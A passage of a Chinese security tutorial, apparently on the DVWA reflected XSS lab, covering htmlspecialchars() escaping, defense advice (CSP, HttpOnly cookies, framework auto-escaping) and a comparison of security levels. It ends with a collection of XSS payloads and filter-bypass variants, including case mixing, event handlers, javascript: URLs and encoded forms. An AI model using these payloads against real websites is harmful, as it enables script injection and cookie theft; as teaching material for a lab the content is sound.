class="comment">// htmlspecialchars() - 将特殊字符转换为HTML实体</span></span><br><span class="line">    <span class="comment">// 参数1：要转换的字符串</span></span><br><span class="line">    <span class="comment">// 参数2：转换标志（可选）</span></span><br><span class="line">    <span class="comment">// 返回值：转换后的字符串</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 转换规则：</span></span><br><span class="line">    <span class="comment">// &amp; （和号）  → &amp;amp;</span></span><br><span class="line">    <span class="comment">// &quot; （双引号） → &amp;quot;（当ENT_NOQUOTES未设置时）</span></span><br><span class="line">    <span class="comment">// &#x27; （单引号） → &amp;#039;（当ENT_QUOTES设置时）</span></span><br><span class="line">    <span class="comment">// &lt; （小于号） → &amp;lt;</span></span><br><span class="line">    <span class="comment">// &gt; （大于号） → &amp;gt;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 作用：将HTML特殊字符转换为实体，使其作为文本显示而不是代码执行</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出编码后的内容</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Hello <span class="subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>htmlspecialchars()工作原理：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 输入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 处理后 --&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 浏览器显示 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>（作为文本显示）</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 不会执行 --&gt;</span></span><br><span class="line">因为&lt;和&gt;被转换为实体，浏览器不会将其解析为HTML标签</span><br></pre></td></tr></table></figure>

<p><strong>详细转换示例：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：&lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line">输出：&amp;lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&amp;gt;</span><br><span class="line">显示：&lt;img src=x onerror=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;（纯文本）</span><br><span class="line"></span><br><span class="line">输入：&lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;</span><br><span class="line">输出：&amp;lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&amp;gt;</span><br><span class="line">显示：&lt;svg onload=<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&gt;（纯文本）</span><br><span class="line"></span><br><span class="line">输入：<span class="string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="string">输出：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#x27;XSS&#x27;)&amp;lt;/script&amp;gt;</span></span><br><span class="line"><span class="string">显示：&quot;</span>&amp;gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;/script&gt;（纯文本）</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被转义：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">尝试1：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（作为文本显示）</span><br><span class="line"></span><br><span class="line">尝试2：<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;lt;</span>img src=x onerror=alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（作为文本显示）</span><br><span class="line"></span><br><span class="line">尝试3：<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;lt;</span>svg onload=alert(&#x27;XSS&#x27;)<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（作为文本显示）</span><br><span class="line"></span><br><span class="line">尝试4：&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">结果：<span class="symbol">&amp;quot;</span><span class="symbol">&amp;gt;</span><span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;XSS&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span></span><br><span class="line">状态：失败（引号也被转义）</span><br></pre></td></tr></table></figure>

<p><strong>关键防御点：</strong></p>
<ol>
<li><strong>所有HTML标签被转义</strong> - <code>&lt;&gt;</code>变为<code>&amp;lt;&amp;gt;</code></li>
<li><strong>引号被转义</strong> - 无法闭合属性</li>
<li><strong>转换为HTML实体</strong> - 浏览器将其视为文本</li>
<li><strong>适用于所有上下文</strong> - 标签、属性、内容都安全</li>
</ol>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-输出编码（最重要）"><a href="#1-输出编码（最重要）" class="headerlink" title="1. 输出编码（最重要）"></a>1. 输出编码（最重要）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ★★★ 推荐：使用htmlspecialchars() ★★★</span></span><br><span class="line"><span class="variable">$safe_output</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user_input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ENT_QUOTES - 转换单引号和双引号</span></span><br><span class="line"><span class="comment">// UTF-8 - 指定字符编码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div&gt;<span class="subst">$safe_output</span>&lt;/div&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-不同上下文使用不同编码"><a href="#2-不同上下文使用不同编码" class="headerlink" title="2. 不同上下文使用不同编码"></a>2. 不同上下文使用不同编码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML内容</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// HTML属性</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$input</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// JavaScript字符串</span></span><br><span class="line"><span class="comment">// 使用json_encode()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;var name = &quot;</span> . <span class="title function_ invoke__">json_encode</span>(<span class="variable">$input</span>) . <span class="string">&quot;;&lt;/script&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// URL参数</span></span><br><span class="line"><span class="title function_ invoke__">urlencode</span>(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// CSS</span></span><br><span class="line"><span class="comment">// 避免用户输入直接进入CSS，或使用CSS编码库</span></span><br></pre></td></tr></table></figure>

<h4 id="3-内容安全策略（CSP）"><a href="#3-内容安全策略（CSP）" class="headerlink" title="3. 内容安全策略（CSP）"></a>3. 内容安全策略（CSP）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置CSP头</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止内联脚本</span></span><br><span class="line"><span class="comment">// 只允许从同源加载脚本</span></span><br></pre></td></tr></table></figure>

<p><strong>CSP配置示例：</strong></p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:</span><br><span class="line">  <span class="literal">default</span>-src <span class="string">&#x27;self&#x27;</span>;                    <span class="meta"># 默认只允许同源</span></span><br><span class="line">  script-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;nonce-&#123;random&#125;&#x27;</span>;   <span class="meta"># 脚本必须有nonce</span></span><br><span class="line">  style-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span>;      <span class="meta"># 允许内联样式</span></span><br><span class="line">  img-src *;                             <span class="meta"># 允许任何来源的图片</span></span><br><span class="line">  <span class="built_in">object</span>-src <span class="string">&#x27;none&#x27;</span>;                     <span class="meta"># 禁止&lt;object&gt;</span></span><br><span class="line">  <span class="keyword">base</span>-uri <span class="string">&#x27;self&#x27;</span>;                       <span class="meta"># 限制&lt;base&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="4-输入验证（辅助）"><a href="#4-输入验证（辅助）" class="headerlink" title="4. 输入验证（辅助）"></a>4. 输入验证（辅助）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 白名单验证</span></span><br><span class="line"><span class="variable">$allowed</span> = <span class="string">&#x27;/^[a-zA-Z0-9 ]+$/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="variable">$allowed</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 长度限制</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Input too long&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5-HttpOnly-Cookie"><a href="#5-HttpOnly-Cookie" class="headerlink" title="5. HttpOnly Cookie"></a>5. HttpOnly Cookie</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 防止JavaScript访问Cookie</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;session&#x27;</span>, <span class="variable">$value</span>, [</span><br><span class="line">    <span class="string">&#x27;httponly&#x27;</span> =&gt; <span class="literal">true</span>,    // 防止XSS窃取Cookie</span><br><span class="line">    <span class="string">&#x27;secure&#x27;</span> =&gt; <span class="literal">true</span>,      // 只通过HTTPS传输</span><br><span class="line">    <span class="string">&#x27;samesite&#x27;</span> =&gt; <span class="string">&#x27;Strict&#x27;</span> // 防止CSRF</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>

<h3 id="框架层面"><a href="#框架层面" class="headerlink" title="框架层面"></a>框架层面</h3><h4 id="Laravel示例"><a href="#Laravel示例" class="headerlink" title="Laravel示例"></a>Laravel示例</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Blade模板自动转义</span></span><br><span class="line">&#123;&#123; <span class="variable">$user_input</span> &#125;&#125;  <span class="comment">// 自动使用htmlspecialchars()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不转义（危险！）</span></span><br><span class="line">&#123;!! <span class="variable">$html_content</span> !!&#125;  <span class="comment">// 仅用于可信内容</span></span><br></pre></td></tr></table></figure>

<h4 id="React示例"><a href="#React示例" class="headerlink" title="React示例"></a>React示例</h4><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// React自动转义</span></span><br><span class="line">&lt;div&gt;&#123;userInput&#125;&lt;<span class="regexp">/div&gt;  /</span><span class="regexp">/ 安全</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ 危险方式（避免使用）</span></span><br><span class="line"><span class="regexp">&lt;div dangerouslySetInnerHTML=&#123;&#123;__html: userInput&#125;&#125; /</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><ol>
<li><p><strong>使用模板引擎</strong></p>
<ul>
<li>Twig（PHP）</li>
<li>Jinja2（Python）</li>
<li>Handlebars（JavaScript）</li>
<li>自动转义输出</li>
</ul>
</li>
<li><p><strong>WAF（Web应用防火墙）</strong></p>
<ul>
<li>ModSecurity</li>
<li>Cloudflare WAF</li>
<li>AWS WAF</li>
</ul>
</li>
<li><p><strong>定期审计</strong></p>
<ul>
<li>代码审计</li>
<li>安全扫描工具</li>
<li>渗透测试</li>
</ul>
</li>
</ol>
<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>输出编码</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ htmlspecialchars</td>
</tr>
<tr>
<td>过滤方式</td>
<td>无</td>
<td>str_replace</td>
<td>preg_replace</td>
<td>N&#x2F;A</td>
</tr>
<tr>
<td>过滤目标</td>
<td>无</td>
<td><code>&lt;script&gt;</code></td>
<td><code>&lt;script&gt;</code>变形</td>
<td>N&#x2F;A</td>
</tr>
<tr>
<td>大小写</td>
<td>N&#x2F;A</td>
<td>敏感</td>
<td>不敏感</td>
<td>N&#x2F;A</td>
</tr>
<tr>
<td>可绕过性</td>
<td>完全开放</td>
<td>容易</td>
<td>容易</td>
<td>不可绕过</td>
</tr>
<tr>
<td>典型Payload</td>
<td><code>&lt;script&gt;</code></td>
<td><code>&lt;img&gt;</code></td>
<td><code>&lt;img&gt;</code></td>
<td>无效</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>简单</td>
<td>不可能</td>
</tr>
</tbody></table>
<hr>
<h2 id="常用XSS-Payload集合"><a href="#常用XSS-Payload集合" class="headerlink" title="常用XSS Payload集合"></a>常用XSS Payload集合</h2><h3 id="基础Payload"><a href="#基础Payload" class="headerlink" title="基础Payload"></a>基础Payload</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 标准脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">domain</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 大小写混淆 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ScRiPt</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 双写绕过 --&gt;</span></span><br><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="事件处理器"><a href="#事件处理器" class="headerlink" title="事件处理器"></a>事件处理器</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- onerror --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(String.fromCharCode(88,83,83))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onload --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onclick --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Click<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Click<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onmouseover --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span>Hover<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="HTML5标签"><a href="#HTML5标签" class="headerlink" title="HTML5标签"></a>HTML5标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- svg --&gt;</span></span><br><span class="line">&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- details --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- video --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- audio --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- marquee --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>Click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML实体编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;<span class="symbol">&amp;#88;</span><span class="symbol">&amp;#83;</span><span class="symbol">&amp;#83;</span>&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Unicode编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006c\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 十六进制编码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6C;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span>(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Base64 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

